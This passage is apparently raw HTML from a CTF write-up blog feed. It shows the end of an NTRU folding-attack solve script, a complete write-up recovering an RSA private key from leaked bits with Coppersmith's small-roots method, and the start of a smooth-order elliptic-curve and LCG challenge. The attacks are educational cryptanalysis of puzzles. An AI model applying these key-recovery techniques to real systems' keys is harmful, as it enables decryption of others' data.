class="mi">119</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">89</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">24</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">124</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">31</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">123</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">68</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">113</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">26</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">112</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">73</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">29</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">122</span><span class="p">,</span> <span class="mi">96</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">30</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">120</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">125</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">39</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">71</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">66</span><span class="p">,</span> <span class="mi">44</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">74</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">118</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">69</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">15</span><span class="p">]</span>

<span class="n">sk</span> <span class="o">=</span> <span class="n">attack</span><span class="p">(</span><span class="n">Rqn</span><span class="p">(</span><span class="n">pk</span><span class="p">))</span>
<span class="n">d</span>  <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span><span class="n">Rqn</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">decode</span><span class="p">(</span><span class="n">d</span><span class="p">)</span><span class="si">:</span><span class="n">x</span><span class="si">}</span><span class="s">').decode()</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="NTRU" /><category term="Folding attack" /><summary type="html"><![CDATA[Challenge overview]]></summary></entry><entry><title type="html">dripfeed (DREAM 2025)</title><link href="https://zukane.github.io/dripfeed/" rel="alternate" type="text/html" title="dripfeed (DREAM 2025)" /><published>2025-08-09T13:00:00+02:00</published><updated>2025-08-09T13:00:00+02:00</updated><id>https://zukane.github.io/dripfeed</id><content type="html" xml:base="https://zukane.github.io/dripfeed/"><![CDATA[<h5 id="challenge-source">Challenge source</h5>

<p>In this CTF challenge we are given the following encryption script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">N</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
<span class="n">z</span> <span class="o">=</span> <span class="mi">768</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"DREAM{???????????????????}"</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>

<span class="n">d</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="n">dinv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="n">N</span><span class="p">)</span>
<span class="n">hint1</span> <span class="o">=</span> <span class="n">dinv</span><span class="o">&gt;&gt;</span><span class="n">z</span>
<span class="n">hint2</span> <span class="o">=</span> <span class="n">d</span><span class="o">&gt;&gt;</span><span class="n">z</span>
<span class="n">hint3</span> <span class="o">=</span> <span class="p">(</span><span class="n">d</span><span class="o">+</span><span class="n">dinv</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="o">^</span><span class="n">z</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">c</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">N</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">hint1</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">hint2</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">hint3</span> <span class="o">=</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<p>as well as the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># c = 22157594335444536824539804957503224316011530105000213270082208221066593944954014666682649028694133674560156641233395573360668940167815220144267273966287820743390179842825813921564442940898448403649268126138366346541999383516847671392288475450503228921663055710261222736364832390636399799464290497677394001206519642230355468553180304124754273599272037090190669770012042290863893500557064375980418378974146770317534675349918371288413139540568026717131002910661522889107223072629684473816850628927719500755853803826053326864257172197282550241873511858288263828888477514571946188043879000715780664003346592804294011506971
# N = 25959541354095379330014211523736588310397407563027174748207817754002783083191533477890701227080867897432606754059572855046962831514143019657762820875501757389522439963278185424652050988351722479628525750386024849935812556785023617595192645219002837901875925863581668399339831969660066794677364550759132546080418952727814971975516789298857515890709426151641917337099113196461301621097058914304208257653769808452628154352488765790619868730683895851799316355220677011268783490458072512607009187871657751973095691749268293154373565622703034299847474396773677657530377712298202962607412888316384251050171382195892089032357
# hint1 = 15464998351280885049978241250677908550052088921543412055926782552569730114201666247473246055105315399223369010505411177494944031761554111167815968593847467862816540005306296674691731101951155559188695276576391852694850824877331682887724674655622324597900452774223029587809308492341771478213616624501365158861467752871506595868846315715135486074129927582766119159732319777572491731729171
# hint2 = 7029540180149905451539102727640301157454585448744864593652215724504532500936678968396248056235311937620576932024119332483872809008873452228603492327252210340060398181762267906930140059244295569523008698632999425529950595502067137205887611567798060711937625579291545624591051982915725104082620929153365192057370102698459062120006997479591134423962335183745677834764356654024492868260852
# hint3 = 190722270955073623160671606729858536606154237775586896348182992398405372984126236409160453609793655987256674610721019302148710014962419023950073167692224689931891238034456934018927853575507080194214703887834623936620950946151655803
</code></pre></div></div>

<p>We are given three hints about the RSA private key d.</p>

<h5 id="recovering-d">Recovering d</h5>

<p>Challenges involving partial information leaks are often solved by using coppersmith’s small roots method. The information given in this challenge is:</p>

<ul>
  <li>The MSBs of $d$ (1280/2048 bits)</li>
  <li>The MSBs of $d^{-1}$ (1280/2048 bits)</li>
  <li>The LSBs of the sum $d + d^{-1}$ (768/2048 bits)</li>
</ul>

<p>We can set up equations for these hints with the unknowns:</p>

\[\large \begin{align}
\nonumber d &amp;= 2^{768} \cdot \text{hint2} + x \\
\nonumber d^{-1} &amp;= 2^{768} \cdot \text{hint1} + y \\
\nonumber x+y &amp;= \text{hint3}
\end{align}\]

<p>We can utilize $hint_{3}$ to eliminate the variable $y$:</p>

\[\large \begin{align}
\nonumber d^{-1} &amp;= 2^{768} \cdot \text{hint1} + y \\
\nonumber d^{-1} &amp;= 2^{768} \cdot \text{hint1} + \text{hint3} - x 
\end{align}\]

<p>However, we must take into consideration that $hint_{3} \equiv d+d^{-1} \bmod 2^{768}$. There may be an extra $2^{768}$ term in $d^{-1}$ depending on the carry bit. In the case of the handout, this term is present:</p>

\[\large d^{-1} = 2^{768} \cdot \text{hint1} + \text{hint3} - x\]

<p>With an expression for $d$ and $d^{-1}$ in terms of $x$, we can set up the following univariate polynomial:</p>

\[\large d \cdot d^{-1} - 1\equiv 0 \mod N\]

<p>The root $x$ has an upper bound of $2^{768}$. This univariate case can easily be solved in SageMath:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">z</span> <span class="o">=</span> <span class="mi">768</span>
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>

<span class="n">d</span>    <span class="o">=</span> <span class="p">(</span><span class="n">hint2</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="n">x</span>
<span class="n">dinv</span> <span class="o">=</span> <span class="p">(</span><span class="n">hint1</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">hint3</span><span class="o">-</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">^</span><span class="n">z</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">d</span><span class="o">*</span><span class="n">dinv</span><span class="o">-</span><span class="mi">1</span>
<span class="n">roots</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">monic</span><span class="p">().</span><span class="n">small_roots</span><span class="p">(</span><span class="n">X</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="n">z</span><span class="p">)</span>
</code></pre></div></div>

<p>And with the root recovered, $d$ can be reconstructed, letting us decrypt the ciphertext:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">hint2</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="n">roots</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)))</span>
<span class="c1"># b'DREAM{sm4ll_r00ts_2_sm4ll}'
</span></code></pre></div></div>

<h5 id="solvesage">solve.sage</h5>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">c</span> <span class="o">=</span> <span class="mi">22157594335444536824539804957503224316011530105000213270082208221066593944954014666682649028694133674560156641233395573360668940167815220144267273966287820743390179842825813921564442940898448403649268126138366346541999383516847671392288475450503228921663055710261222736364832390636399799464290497677394001206519642230355468553180304124754273599272037090190669770012042290863893500557064375980418378974146770317534675349918371288413139540568026717131002910661522889107223072629684473816850628927719500755853803826053326864257172197282550241873511858288263828888477514571946188043879000715780664003346592804294011506971</span>
<span class="n">N</span> <span class="o">=</span> <span class="mi">25959541354095379330014211523736588310397407563027174748207817754002783083191533477890701227080867897432606754059572855046962831514143019657762820875501757389522439963278185424652050988351722479628525750386024849935812556785023617595192645219002837901875925863581668399339831969660066794677364550759132546080418952727814971975516789298857515890709426151641917337099113196461301621097058914304208257653769808452628154352488765790619868730683895851799316355220677011268783490458072512607009187871657751973095691749268293154373565622703034299847474396773677657530377712298202962607412888316384251050171382195892089032357</span>
<span class="n">hint1</span> <span class="o">=</span> <span class="mi">15464998351280885049978241250677908550052088921543412055926782552569730114201666247473246055105315399223369010505411177494944031761554111167815968593847467862816540005306296674691731101951155559188695276576391852694850824877331682887724674655622324597900452774223029587809308492341771478213616624501365158861467752871506595868846315715135486074129927582766119159732319777572491731729171</span>
<span class="n">hint2</span> <span class="o">=</span> <span class="mi">7029540180149905451539102727640301157454585448744864593652215724504532500936678968396248056235311937620576932024119332483872809008873452228603492327252210340060398181762267906930140059244295569523008698632999425529950595502067137205887611567798060711937625579291545624591051982915725104082620929153365192057370102698459062120006997479591134423962335183745677834764356654024492868260852</span>
<span class="n">hint3</span> <span class="o">=</span> <span class="mi">190722270955073623160671606729858536606154237775586896348182992398405372984126236409160453609793655987256674610721019302148710014962419023950073167692224689931891238034456934018927853575507080194214703887834623936620950946151655803</span>

<span class="n">z</span> <span class="o">=</span> <span class="mi">768</span>
<span class="n">R</span><span class="p">.</span><span class="o">&lt;</span><span class="n">x</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>

<span class="n">d</span>    <span class="o">=</span> <span class="p">(</span><span class="n">hint2</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="n">x</span>
<span class="n">dinv</span> <span class="o">=</span> <span class="p">(</span><span class="n">hint1</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">hint3</span><span class="o">-</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">^</span><span class="n">z</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="n">d</span><span class="o">*</span><span class="n">dinv</span><span class="o">-</span><span class="mi">1</span>
<span class="n">roots</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">monic</span><span class="p">().</span><span class="n">small_roots</span><span class="p">(</span><span class="n">X</span><span class="o">=</span><span class="mi">2</span><span class="o">^</span><span class="n">z</span><span class="p">)</span>

<span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">hint2</span><span class="o">&lt;&lt;</span><span class="n">z</span><span class="p">)</span> <span class="o">+</span> <span class="n">roots</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">N</span><span class="p">)))</span>
</code></pre></div></div>]]></content><author><name>Zukane</name></author><category term="writeups" /><category term="Coppersmith small roots" /><category term="RSA" /><summary type="html"><![CDATA[Challenge source]]></summary></entry><entry><title type="html">L-iptic Curve Gimmick (DREAM 2025)</title><link href="https://zukane.github.io/liptic-curve-gimmick/" rel="alternate" type="text/html" title="L-iptic Curve Gimmick (DREAM 2025)" /><published>2025-08-09T13:00:00+02:00</published><updated>2025-08-09T13:00:00+02:00</updated><id>https://zukane.github.io/liptic-curve-gimmick</id><content type="html" xml:base="https://zukane.github.io/liptic-curve-gimmick/"><![CDATA[<h5 id="challenge-overview">Challenge Overview</h5>

<p>In this CTF challenge we are given the following encryption script:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">os</span><span class="p">,</span> <span class="n">hashlib</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">289938057806527723758225206013420438469</span> 
<span class="n">a</span> <span class="o">=</span> <span class="mi">131472054804376335219486973894036812363</span> 
<span class="n">b</span> <span class="o">=</span> <span class="mi">168821582640259041697285427337782028716</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">])</span>
<span class="n">G</span> <span class="o">=</span> <span class="n">E</span><span class="p">.</span><span class="n">gen</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">state</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">state</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">()</span>
<span class="n">iv</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">LCG</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">state</span>
    <span class="n">state</span> <span class="o">=</span> <span class="p">(</span><span class="mi">6364136223846793005</span><span class="o">*</span><span class="n">state</span> <span class="o">+</span> <span class="mi">1442695040888963407</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span>
    <span class="k">return</span> <span class="n">state</span><span class="o">&gt;&gt;</span><span class="mi">32</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"DREAM{?????????????????????????????????}"</span>

<span class="c1"># mix it up!
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1337</span><span class="p">):</span>
    <span class="n">P</span> <span class="o">=</span> <span class="n">LCG</span><span class="p">()</span><span class="o">*</span><span class="n">G</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">P</span> <span class="o">=</span> <span class="n">LCG</span><span class="p">()</span><span class="o">*</span><span class="n">G</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"P</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s"> = E(</span><span class="si">{</span><span class="n">P</span><span class="p">.</span><span class="n">x</span><span class="p">()</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">P</span><span class="p">.</span><span class="n">y</span><span class="p">()</span><span class="si">}</span><span class="s">)"</span><span class="p">)</span>

<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">ct</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"iv = '</span><span class="si">{</span><span class="n">iv</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"ct = '</span><span class="si">{</span><span class="n">ct</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span><span class="si">}</span><span class="s">'"</span><span class="p">)</span>
</code></pre></div></div>

<p>As well as the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>P1 = E(122037775221140048457289031201689495704, 122951420735275891082341998031602353733)
P2 = E(184410941665585900129539390660771625087, 171416669794932710291436536477699627840)
P3 = E(273827286896900834170681338812413416705, 75421249071279152991789476076300962651)
iv = '3d7c4da2defd1b78a0feccbb553dd4da'
ct = '081393130914bdd8c625786160f8de0dfd0dd5a4f3c2ca946b803cfe565082849827c9c0794db358ee81bc734f0fb361'
</code></pre></div></div>

<h5 id="source-code-analysis">Source code analysis</h5>

<p>The encryption script creates an Elliptic Curve with some non-standard curve parameters.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="mi">289938057806527723758225206013420438469</span> 
<span class="n">a</span> <span class="o">=</span> <span class="mi">131472054804376335219486973894036812363</span> 
<span class="n">b</span> <span class="o">=</span> <span class="mi">168821582640259041697285427337782028716</span>
<span class="n">E</span> <span class="o">=</span> <span class="n">EllipticCurve</span><span class="p">(</span><span class="n">GF</span><span class="p">(</span><span class="n">p</span><span class="p">),</span> <span class="p">[</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">])</span>
</code></pre></div></div>

<p>The first step is often to investigate properties of the curve parameters. In our case, it turns out that the curve order is quite smooth:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">factor</span><span class="p">(</span><span class="n">E</span><span class="p">.</span><span class="n">order</span><span class="p">())</span>
<span class="mi">11</span> <span class="o">*</span> <span class="mi">117101</span> <span class="o">*</span> <span class="mi">457517</span> <span class="o">*</span> <span class="mi">682657</span> <span class="o">*</span> <span class="mi">1814651</span> <span class="o">*</span> <span class="mi">6542287</span> <span class="o">*</span> <span class="mi">60704299</span>
</code></pre></div></div>

<p>A smooth curve order makes the discrete logarithm easy to solve by using a subgroup attack, for example by using the baby-step giant-step method.</p>

<p>The script also generates an initial state, hashes the state with SHA256 to generate a key, and generates an initialization vector. The key and IV are later used to encrypt the flag.</p>

<p>The encryption script also defines a Linear Congruential Generator</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">LCG</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">state</span>
